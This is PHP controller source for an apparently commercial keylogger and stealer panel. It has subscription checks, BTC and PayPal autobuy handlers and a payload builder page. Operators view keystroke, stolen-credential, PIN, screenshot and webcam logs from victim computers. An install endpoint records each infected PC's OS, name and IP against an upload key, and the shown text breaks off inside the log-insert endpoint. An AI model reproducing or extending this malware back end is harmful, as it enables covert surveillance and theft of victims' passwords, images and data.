<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Main extends CI_Controller {

	function __construct()
	{
		parent::__construct();
		date_default_timezone_set('US/Central');
	}

	function index()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {

			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Define dates for the charts.
		$today = date('d-M-Y');
		$yesterday = date('d-M-Y', strtotime('-1 days'));
		$twodaysago = date('d-M-Y', strtotime('-2 days'));
		$threedaysago = date('d-M-Y', strtotime('-3 days'));

		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
			$data['expire'] = $UD->expiration_date;
		}
		// Get logs amount for today.
		$data['logsToday'] = $this->manage->logsChart($data['uid'], $today);
		// Get logs amount for yesterday.
		$data['logsYesterday'] = $this->manage->logsChart($data['uid'], $yesterday);
		// Get logs amount for two days ago.
		$data['logs2daysAgo'] = $this->manage->logsChart($data['uid'], $twodaysago);
 		// Get logs amount for three days ago.
 		$data['logs3daysAgo'] = $this->manage->logsChart($data['uid'], $threedaysago);
 		// Get logs amount for total.
 		$data['logsTotal'] = $this->manage->logsChart($data['uid'], 'total');

		// Logs for 98.
 		$data['logstoday98'] = $this->manage->PCChart($data['uid'], $today, 'Windows 98');
 		$data['logsyesterday98'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 98');
 		$data['logs2daysago98'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 98');
 		$data['logs3daysago98'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 98');
 		$data['logstotal98'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 98');
 		
 		// Logs for XP.
 		$data['logstodayXP'] = $this->manage->PCChart($data['uid'], $today, 'Windows XP');
 		$data['logsyesterdayXP'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows XP');
 		$data['logs2daysagoXP'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows XP');
 		$data['logs3daysagoXP'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows XP');
 		$data['logstotalXP'] = $this->manage->PCChart($data['uid'], 'total', 'Windows XP');

 		// Logs for Vista.
 		$data['logstodayVista'] = $this->manage->PCChart($data['uid'], $today, 'Windows Vista');
 		$data['logsyesterdayVista'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows Vista');
 		$data['logs2daysagoVista'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows Vista');
 		$data['logs3daysagoVista'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows Vista');
 		$data['logstotalVista'] = $this->manage->PCChart($data['uid'], 'total', 'Windows Vista');

 		// Logs for Win 7.
 		$data['logstoday7'] = $this->manage->PCChart($data['uid'], $today, 'Windows 7');
 		$data['logsyesterday7'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 7');
 		$data['logs2daysago7'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 7');
 		$data['logs3daysago7'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 7');
 		$data['logstotal7'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 7');

 		// Logs for Win 8.
 		$data['logstoday8'] = $this->manage->PCChart($data['uid'], $today, 'Windows 8');
 		$data['logsyesterday8'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 8');
 		$data['logs2daysago8'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 8');
 		$data['logs3daysago8'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 8');
 		$data['logstotal8'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 8');

                // Logs for Win 8.1
 		$data['logstoday81'] = $this->manage->PCChart($data['uid'], $today, 'Windows 8.1');
 		$data['logsyesterday81'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 8.1');
 		$data['logs2daysago81'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 8.1');
 		$data['logs3daysago81'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 8.1');
 		$data['logstotal81'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 8.1');
		
		// Logs for Win 10
 		$data['logstoday10'] = $this->manage->PCChart($data['uid'], $today, 'Windows 10');
 		$data['logsyesterday10'] = $this->manage->PCChart($data['uid'], $yesterday, 'Windows 10');
 		$data['logs2daysago10'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Windows 10');
 		$data['logs3daysago10'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Windows 10');
 		$data['logstotal10'] = $this->manage->PCChart($data['uid'], 'total', 'Windows 10');

 		// Logs for unknown.
 		$data['logstodayUnknown'] = $this->manage->PCChart($data['uid'], $today, 'Unknown');
 		$data['logsyesterdayUnknown'] = $this->manage->PCChart($data['uid'], $yesterday, 'Unknown');
 		$data['logs2daysagoUnknown'] = $this->manage->PCChart($data['uid'], $twodaysago, 'Unknown');
 		$data['logs3daysagoUnknown'] = $this->manage->PCChart($data['uid'], $threedaysago, 'Unknown');
 		$data['logstotalUnknown'] = $this->manage->PCChart($data['uid'], 'total', 'Unknown');

		// Get keylogger log amount.
		$data['log_amount'] = $this->manage->getlogAmount($data['uid'], 0);
		// Get keylogged computers amount.
		$data['computer_amount'] = $this->manage->getPCAmount($data['uid']);
		// Load the index view and pass the $data array.
		$this->load->view('index', $data);
	}

    function subscribe()
    {
        include 'includes/ipn.php';
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user already has a subscription.
        if ($this->manage->hasSubscription()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        $data['ipn'] = new \PayPal\IPN(array(
            "business" => "",
            "currency_code" => "USD"
        ));

        // Load the subscription view.
        $this->load->view('subscribe', $data);
    }

    function builder()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        // Load the builder view.
        $this->load->view('builder', $data);
    }

	function logs()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 1);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Get screenshot log amount.
		$data['screenshot_log_amount'] = $this->manage->getlogAmount($data['uid'], 4);
		// Get webcamsnap log amount.
		$data['webcamsnap_log_amount'] = $this->manage->getlogAmount($data['uid'], 5);
		// Load the index view and pass the $data array.
		$this->load->view('logs', $data);	
	}
	
	function stealer()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 2);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Get screenshot log amount.
		$data['screenshot_log_amount'] = $this->manage->getlogAmount($data['uid'], 4);
		// Get webcamsnap log amount.
		$data['webcamsnap_log_amount'] = $this->manage->getlogAmount($data['uid'], 5);
		// Load the index view and pass the $data array.
		$this->load->view('stealer', $data);	
	}

	function pinlogger()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 3);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Get screenshot log amount.
		$data['screenshot_log_amount'] = $this->manage->getlogAmount($data['uid'], 4);
		// Get webcamsnap log amount.
		$data['webcamsnap_log_amount'] = $this->manage->getlogAmount($data['uid'], 5);
		// Load the index view and pass the $data array.
		$this->load->view('pinlogger', $data);	
	}
	
	function screenshot()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 4);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Get screenshot log amount.
		$data['screenshot_log_amount'] = $this->manage->getlogAmount($data['uid'], 4);
		// Get webcamsnap log amount.
		$data['webcamsnap_log_amount'] = $this->manage->getlogAmount($data['uid'], 5);
		// Load the index view and pass the $data array.
		$this->load->view('screenshot', $data);	
	}

	function webcamsnap()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Get logs.
		$data['logs'] = $this->manage->getLogs($data['uid'], 5);
		// Get keylogger log amount.
		$data['keylogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 1);
		// Get stealer log amount.
		$data['stealer_log_amount'] = $this->manage->getlogAmount($data['uid'], 2);
		// Get pinlogger log amount.
		$data['pinlogger_log_amount'] = $this->manage->getlogAmount($data['uid'], 3);
		// Get screenshot log amount.
		$data['screenshot_log_amount'] = $this->manage->getlogAmount($data['uid'], 4);
		// Get webcamsnap log amount.
		$data['webcamsnap_log_amount'] = $this->manage->getlogAmount($data['uid'], 5);
		// Load the index view and pass the $data array.
		$this->load->view('webcamsnap', $data);	
	}
	
    function ipn($method)
    {
        error_reporting(0);
        // BTC Autobuy
        if ($method == 'btc') {

            $cp_merchant_id = '';
            $cp_ipn_secret = '';
            $cp_debug_email = '';

            $order_currency = 'USD';

            function errorAndDie($error_msg) {
                global $cp_debug_email;
                if (!empty($cp_debug_email)) {
                    $report = 'Error: '.$error_msg."\n\n";
                    $report .= "POST Data\n\n";
                    foreach ($_POST as $k => $v) {
                        $report .= "|$k| = |$v|\n";
                    }
                    mail($cp_debug_email, 'CoinPayments IPN Error', $report);
                }
                die('IPN Error: '.$error_msg);
            }

            if (!isset($_POST['ipn_mode']) || $_POST['ipn_mode'] != 'hmac') {
                errorAndDie('IPN Mode is not HMAC');
            }

            if (!isset($_SERVER['HTTP_HMAC']) || empty($_SERVER['HTTP_HMAC'])) {
                errorAndDie('No HMAC signature sent.');
            }

            $request = file_get_contents('php://input');
            if ($request === FALSE || empty($request)) {
                errorAndDie('Error reading POST data');
            }

            if (!isset($_POST['merchant']) || $_POST['merchant'] != trim($cp_merchant_id)) {
                errorAndDie('No or incorrect Merchant ID passed');
            }

            $hmac = hash_hmac("sha512", $request, trim($cp_ipn_secret));
            if ($hmac != $_SERVER['HTTP_HMAC']) {
                errorAndDie('HMAC signature does not match');
            }


            $txn_id = $_POST['txn_id'];
            $item_name = $_POST['item_name'];
            $item_number = $_POST['item_number'];
            $amount1 = floatval($_POST['amount1']);
            $amount2 = floatval($_POST['amount2']);
            $currency1 = $_POST['currency1'];
            $currency2 = $_POST['currency2'];
            $status = intval($_POST['status']);
            $status_text = $_POST['status_text'];
            $uid = trim($_POST['custom']);

            if ($currency1 != $order_currency) {
                errorAndDie('Original currency mismatch!');
            }

            if ($status >= 100 || $status == 2) {
                // 1 Month
                if ($amount1 == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
                // 3 Months
                if ($amount1 == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
                // 1 Year
                if ($amount1 == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'BTC', $txn_id, $amount1, date('d-M-Y h:i:s'));
                }
            } else if ($status < 0) {
                //payment error, this is usually final but payments will sometimes be reopened if there was no exchange rate conversion or with seller consent
            } else {
                //payment is pending, you can optionally add a note to the order page
            }
            die('IPN OK');

        }
        // PayPal autobuy.
        if ($method == 'PayPal') {
            // Include the class file.
            include  'includes/ipn.php';
            $ipn = new \PayPal\IPN();
            $ipn->log = TRUE;
            $ipn->setSandbox(TRUE);
            if ($ipn->verify()) {

                // Retreive IPN variables.
                $ipnVariables = $ipn->getData();
                // Get UID
                $uid = $ipnVariables->custom;
                // Assign the amount paid to the paid variable.
                $paid = $ipnVariables->mc_gross;

                // Check if they paid enough for 1 month.
                if ($paid == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

                // Check if they paid enough for 3 months.
                if ($paid == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

                // Check if they paid enough for 1 year.
                if ($paid == '') {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                    // Add payment history.
                    $this->manage->addPayment($uid, 'PayPal', $ipnVariables->txn_id, $paid, date('d-M-Y h:i:s'));
                }

            }
        }

    }

	function account()
	{
		// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Load the account view.
		$this->load->view('account', $data);	
	}

	function coupon()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $uid = $UD->uid;
        }
        // Set our form validation rules.
        $this->form_validation->set_rules('code', 'Code', 'required|trim|max_length[25]');
        // Run the form validation and check if it returned true.
        if ($this->form_validation->run()) {
            // Check if coupon is valid.
            $coupon = $this->manage->couponValid($this->input->post('code'));
            if ($coupon != false) {
                if ($coupon == 1) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+30 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                } else if ($coupon == 2) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+90 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                } else if ($coupon == 3) {
                    // Create sub expiration date.
                    $date = date('d/m/y', strtotime('+365 days'));
                    // Add subscription.
                    $this->manage->addSubscription($uid, $date);
                }
                die('1');
            } else {
                die('0');
            }
        }
    }

	function login()
	{
		$data['invalid'] = false;
		$this->load->view('login', $data);
	}

	function register()
	{
		// Captcha
        $original_string = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
        $original_string = implode("", $original_string);
        $captcha = substr(str_shuffle($original_string), 0, 6);
        $vals = array(
            'word' => $captcha,
            'img_path' => 'captcha/',
            'img_url' => 'captcha/',
            'font_path' => BASEPATH.'fonts/texb.ttf',
            'img_width' => 120,
            'img_height' => 40,
            'expiration' => 7200
        );
        $cap = create_captcha($vals);
        $data['image'] = $cap['image'];
        $this->session->set_userdata(array('captcha'=>$captcha, 'image' => $cap['time'].'.jpg'));
		$this->load->view('register', $data);
	}

	function do_login()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|md5');
		$this->form_validation->set_error_delimiters('<li style="margin-left: 20px;">', '</li>');

		// Run the form validation and check if it returned true.
		if ($this->form_validation->run()) {
			// Check credentials.
			if ($this->manage->checkCredentials($this->input->post('username'), $this->input->post('password'))) {
				// Create our session data array.
				$sessionData = array(
					'username'	=> $this->input->post('username'),
					'logged_in' => true
				);
				// Set our session data.
				$this->session->set_userdata($sessionData);
				// Redirect to the dashboard.
				redirect('index', 'refresh');
				die();
			} else {
				// Login failed, load the login view.
				$data['invalid'] = true;
				$this->load->view('login', $data);
			}
		} else {
			$data['invalid'] = false;
			// Load the login view.
			$this->load->view('login', $data);
		}	
	}

	function checklogin()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|md5');
		$this->form_validation->set_rules('hwid', 'HWID', 'required|trim');


		// Run the form validation and check if it returned true.
		if ($this->form_validation->run()) {

			// Check the credentials.
			if ($this->manage->checkCredentials($this->input->post('username'), $this->input->post('password'))) {


				// Create our session data array.
				$sessionData = array(
					'username'	=> $this->input->post('username'),
					'logged_in' => true
				);
				// Set our session data.
				$this->session->set_userdata($sessionData);

				// Get encrypted HWID of the user.
				$encrypted_hwid = $this->manage->getHWID($this->input->post('username'));
                // Get decrypted HWID of the user.
                $decrypted_hwid = $this->encrypt->decode($encrypted_hwid);

				// Check if the HWID doesn't match the user account.
				if ($this->input->post('hwid') !== $decrypted_hwid) {
					die('4');
				}
				// Check if the user is banned.
				if ($this->manage->isBanned()) {
					die('2');
				} else
				// Check if the user has a subscription.
				if (!$this->manage->hasSubscription()) {
					die('3');
				} else
				if ($this->manage->hasSubscription()) {
					die('1' . $this->manage->getSubscription());
				}
			} else {
				die('0');
			}

		}
	}

	function do_register()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('username', 'Username', 'required|trim|max_length[15]|is_unique[users.username]');
		$this->form_validation->set_rules('email', 'Email Address', 'required|trim|valid_email|is_unique[users.email]');
		$this->form_validation->set_rules('hwid', 'HWID', 'required|trim');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|min_length[5]|md5');
		$this->form_validation->set_rules('cpassword', 'Confirm Password', 'required|trim|matches[password]');
		// $this->form_validation->set_rules('captcha', 'Captcha', 'required|callback_verify_captcha');
		$this->form_validation->set_error_delimiters('<li style="margin-left: 20px;">', '</li>');

		// Run the form validation and see if it returned true.
		if ($this->form_validation->run()) {
			// Unique upload key function.
			function uniqueuploadKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}
			// Create account.
			if ($this->manage->createAccount($this->input->post('username'), $this->input->post('email'), $this->input->post('password'), uniqueuploadKey(), $this->encrypt->encode($this->input->post('hwid')))) {
				// Update the registered variable to true.
				$data['registered'] = true;
				$data['invalid'] = false;
				// Load the login view.
				$this->load->view('login', $data);
			}	
		} else {
			// Captcha
        	$original_string = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
        	$original_string = implode("", $original_string);
        	$captcha = substr(str_shuffle($original_string), 0, 6);
        	$vals = array(
            	'word' => $captcha,
            	'img_path' => 'captcha/',
            	'img_url' => 'captcha/',
            	'font_path' => BASEPATH.'fonts/texb.ttf',
            	'img_width' => 120,
            	'img_height' => 40,
            	'expiration' => 7200
        	);
        	$cap = create_captcha($vals);
        	$data['image'] = $cap['image'];
        	$this->session->set_userdata(array('captcha'=>$captcha, 'image' => $cap['time'].'.jpg'));
			// Form validation failed, load the register view.
			$this->load->view('register', $data
				);
		}
	}

	function verify_captcha($captcha)
    {
        if ($this->session->userdata('captcha') == $captcha ) {
            return true;
        } else {
            $this->form_validation->set_message('verify_captcha', 'The characters you entered do not match the captcha.');
            return false;
        }
    }

    function terms()
    {
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Check if the user is an admin.
        if (!$this->manage->isAdmin()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }
        // Load the terms view.
        $this->load->view('terms', $data);
    }

    function admin($page)
    {
        error_reporting(0);
        // Check if the user is logged in.
        if (!$this->session->userdata('logged_in')) {
            redirect('login', 'refresh');
            die();
        }
        // Check if the user is banned.
        if ($this->manage->isBanned()) {
            redirect('banned', 'refresh');
            die();
        }
        // Check if the user has a subscription.
        if (!$this->manage->hasSubscription()) {
            redirect('subscribe', 'refresh');
            die();
        }
        // Check if the user is an admin.
        if (!$this->manage->isAdmin()) {
            redirect('index', 'refresh');
            die();
        }
        // Get user data.
        $userData = $this->manage->getuserData();
        // Set user data.
        foreach ($userData as $UD) {
            $data['uid'] = $UD->uid;
            $data['username'] = $UD->username;
            $data['email'] = $UD->email;
            $data['key'] = $UD->upload_key;
            $data['group'] = $UD->group;
        }

        // Pages.
        if ($page == 'overview') {
            // Get user count.
            $data['user_count'] = $this->manage->userCount();
            // Get total made.
            $data['total_made'] = $this->manage->totalMade();
            // Load the overview view.
            $this->load->view('overview', $data);
        } else if ($page == 'users') {
            // Get user list.
            $data['users'] = $this->manage->getUsers();
            // Load the users view.
            $this->load->view('users', $data);
        } else if ($page == 'settings') {

        } else {
            redirect('index', 'refresh');
            die();
        }

    }

    function update($type) 
    {
    	// Check if the user is logged in.
		if (!$this->session->userdata('logged_in')) {
			redirect('login', 'refresh');
			die();
		}
		// Check if the user is banned.
		if ($this->manage->isBanned()) {
			redirect('banned', 'refresh');
			die();
		}
		// Check if the user has a subscription.
		if (!$this->manage->hasSubscription()) {
			redirect('subscribe', 'refresh');
			die();
		}
		// Get user data.
		$userData = $this->manage->getuserData();
		// Set user data.
		foreach ($userData as $UD) {
			$data['uid'] = $UD->uid;
			$data['username'] = $UD->username;
			$data['email'] = $UD->email;
			$data['key'] = $UD->upload_key;
			$data['group'] = $UD->group;
		}
		// Generate new upload key.
		if ($type == 'key')	{
			// Unique upload key function.
			function uniqueuploadKey($length = 32) {
    			$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    			$randomString = '';
    			for ($i = 0; $i < $length; $i++) {
        			$randomString .= $characters[rand(0, strlen($characters) - 1)];
    			}
    			return $randomString;
			}
			if ($this->manage->generateKey(uniqueuploadKey())) {
				$data['updated_key'] = true;
				redirect('account#updated_key', 'refresh');
				die();
				
			}
		}
		// Update password.
		if ($type == 'password') {
			// Set our form validation rules.
			$this->form_validation->set_rules('new_password', 'New Password', 'required|trim|md5');
			$this->form_validation->set_rules('repeat_password', 'Repeat Password', 'required|trim|matches[new_password]');
			$this->form_validation->set_rules('cur_pass', 'Current Password', 'required|trim|md5|callback_checkPassword');
			// Run the form validation and check if it returned true.
			if ($this->form_validation->run()) {
                // Change password.
                if ($this->manage->changePassword($this->input->post('new_password'))) {
                    redirect('account#password', 'refresh');
                    die();
                } else {
                    redirect('account#error', 'refresh');
                    die();
                }
			} else {
				redirect('account#error', 'refresh');
                die();
			}
		}
        // Update email.
        if ($type == 'email') {
            // Set our form validation rules.
            $this->form_validation->set_rules('new_email', 'New Email', 'required|trim|valid_email|is_unique[users.email]');
            $this->form_validation->set_rules('repeat_email', 'Repeat Email', 'required|trim|matches[new_email]');
            $this->form_validation->set_rules('cur_pass_email', 'Current Password', 'required|trim|md5|callback_checkPassword');
            // Run the form validation and check if it returned true.
            if ($this->form_validation->run()) {
                // Change email.
                if ($this->manage->changeEmail($data['uid'], $this->input->post('new_email'))) {
                    redirect('account#email', 'refresh');
                    die();
                } else {
                    redirect('account#error', 'refresh');
                    die();
                }
            } else {
                redirect('account#error', 'refresh');
                die();
            }
        }
    }

    function checkPassword($password)
    {
        if ($this->manage->checkCredentials($this->session->userdata('username'), $password)) {
            return true;
        } else {
            $this->form_validation->set_message('checkPassword', 'The password you entered does not match your current one.');
        }
    }

    function install()
    {
    	// Set our form validation rules.
    	$this->form_validation->set_rules('key', 'Upload Key', 'required|trim|callback_checkKey');
    	$this->form_validation->set_rules('os', 'Operating System', 'required|trim');
    	$this->form_validation->set_rules('pcname', 'PC Name', 'required|trim');

    	if ($this->form_validation->run()) {

    		// Get the UID of the given key.
    		$uid = trim($this->manage->getUIDfromKey($this->input->post('key')));

    		// Add the computer.
    		if ($this->manage->addInstallation($uid, $this->input->post('key'), $this->input->post('os'), $this->input->post('pcname'), $this->input->ip_address(), date('d-M-Y '), date('d-M-Y h:i:s'))) {
    			die('ok');
    		}
    	}	
    }

	function insert()
	{
		// Set our form validation rules.
		$this->form_validation->set_rules('key', 'Upload key', 'required|trim|callback_checkKey');
		$this->form_validation->set_rules('type', 'Type of log', 'required|trim');
